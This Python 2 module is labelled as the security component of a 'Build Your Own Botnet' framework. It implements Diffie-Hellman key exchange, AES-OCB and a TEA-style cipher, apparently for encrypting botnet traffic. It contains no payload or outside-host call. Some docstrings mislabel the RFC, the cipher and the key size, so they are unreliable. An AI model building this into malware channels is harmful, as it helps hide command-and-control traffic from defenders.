#!/usr/bin/python
# -*- coding: utf-8 -*-
'Security (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import json
import struct
import base64
import socket
import urllib
import logging
import tempfile
import StringIO

# packages
try:
    import Cryptodome.Hash.HMAC
    import Cryptodome.Cipher.AES
    import Cryptodome.Hash.SHA256
    import Cryptodome.Util.number
    import Cryptodome.PublicKey.RSA
    import Cryptodome.Cipher.PKCS1_OAEP
except ImportError:
    pass

# main
def diffiehellman(connection):
    """
    Diffie-Hellman Internet Key Exchange (RFC 2741)

    `Requires`
    :param socket connection:     socket.socket object

    Returns the 256-bit binary digest of the SHA256 hash
    of the shared session encryption key
    """
    if isinstance(connection, socket.socket):
        g  = 2
        p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        a  = Cryptodome.Util.number.bytes_to_long(os.urandom(32))
        xA = pow(g, a, p)
        connection.send(Cryptodome.Util.number.long_to_bytes(xA))
        xB = Cryptodome.Util.number.bytes_to_long(connection.recv(256))
        x  = pow(xB, a, p)
        return Cryptodome.Hash.SHA256.new(Cryptodome.Util.number.long_to_bytes(x)).digest()
    else:
        raise TypeError("argument 'connection' must be type '{}'".format(socket.socket))

def encrypt_aes(plaintext, key, padding=chr(0)):
    """
    AES-256-OCB encryption

    `Requires`
    :param str plaintext:   plain text/data
    :param str key:         session encryption key

    `Optional`
    :param str padding:     default: (null byte)

    Returns encrypted ciphertext as base64-encoded string

    """
    cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_OCB)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    output = b''.join((cipher.nonce, tag, ciphertext))
    return base64.b64encode(output)

def decrypt_aes(ciphertext, key, padding=chr(0)):
    """
    AES-256-OCB decryption

    `Requires`
    :param str ciphertext:  encrypted block of data
    :param str key:         session encryption key

    `Optional`
    :param str padding:     default: (null byte)

    Returns decrypted plaintext as string

    """
    data = StringIO.StringIO(base64.b64decode(ciphertext))
    nonce, tag, ciphertext = [ data.read(x) for x in (Cryptodome.Cipher.AES.block_size - 1, Cryptodome.Cipher.AES.block_size, -1) ]
    cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_OCB, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    """
    XOR-128 encryption

    `Required`
    :param str data:        plaintext
    :param str key:         256-bit key

    `Optional`
    :param int block_size:  block size
    :param int key_size:    key size
    :param int num_rounds:  number of rounds
    :param str padding:     padding character

    Returns encrypted ciphertext as base64-encoded string

    """
    data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = os.urandom(8)
    result  = [vector]
    for block in blocks:
        block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
        v0, v1  = struct.unpack("!2L", block)
        k       = struct.unpack("!4L", key[:key_size])
        sum, delta, mask = 0, 0x9e3779b9, 0xffffffff
        for round in range(num_rounds):
            v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            sum = (sum + delta) & mask
            v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
        output  = vector = struct.pack("!2L", v0, v1)
        result.append(output)
    return base64.b64encode(bytes().join(result))

def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    """
    XOR-128 encryption

    `Required`
    :param str data:        ciphertext
    :param str key:         256-bit key

    `Optional`
    :param int block_size:  block size
    :param int key_size:    key size
    :param int num_rounds:  number of rounds
    :param str padding:     padding character

    Returns decrypted plaintext as string

    """
    data    = base64.b64decode(data)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = blocks[0]
    result  = []
    for block in blocks[1:]:
        v0, v1  = struct.unpack("!2L", block)
        k0     = struct.unpack("!4L", key[:key_size])
        delta, mask = 0x9e3779b9, 0xffffffff
        sum     = (delta * num_rounds) & mask
        for round in range(num_rounds):
            v1  = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k0[sum >> 11 & 3]))) & mask
            sum = (sum - delta) & mask
            v0  = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k0[sum & 3]))) & mask
        decode  = struct.pack("!2L", v0, v1)
        output  = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
        vector  = block
        result.append(output)
    return str().join(result).rstrip(padding)
